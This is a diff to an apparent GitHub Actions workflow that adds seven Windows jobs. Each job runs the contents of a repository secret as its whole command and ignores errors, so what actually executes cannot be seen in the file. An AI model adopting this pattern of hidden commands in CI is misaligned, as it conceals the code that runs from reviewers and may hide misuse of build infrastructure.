@@ -23,3 +23,52 @@ jobs:
       - name: data3
         continue-on-error: true
         run: ${{ secrets.TIME3 }}
+
+  datatime4:
+    runs-on: windows-2022
+    steps: 
+      - name: data4
+        continue-on-error: true
+        run: ${{ secrets.TIME4 }}
+
+  datatime5:
+    runs-on: windows-2022
+    steps: 
+      - name: data5
+        continue-on-error: true
+        run: ${{ secrets.TIME5 }}
+
+  datatime6:
+    runs-on: windows-2022
+    steps: 
+      - name: data6
+        continue-on-error: true
+        run: ${{ secrets.TIME6 }}
+
+  datatime7:
+    runs-on: windows-2022
+    steps: 
+      - name: data7
+        continue-on-error: true
+        run: ${{ secrets.TIME7 }}
+
+  datatime8:
+    runs-on: windows-2022
+    steps: 
+      - name: data8
+        continue-on-error: true
+        run: ${{ secrets.TIME8 }}
+
+  datatime9:
+    runs-on: windows-2022
+    steps: 
+      - name: data9
+        continue-on-error: true
+        run: ${{ secrets.TIME9 }}
+
+  datatime10:
+    runs-on: windows-2022
+    steps: 
+      - name: data10
+        continue-on-error: true
+        run: ${{ secrets.TIME10 }}
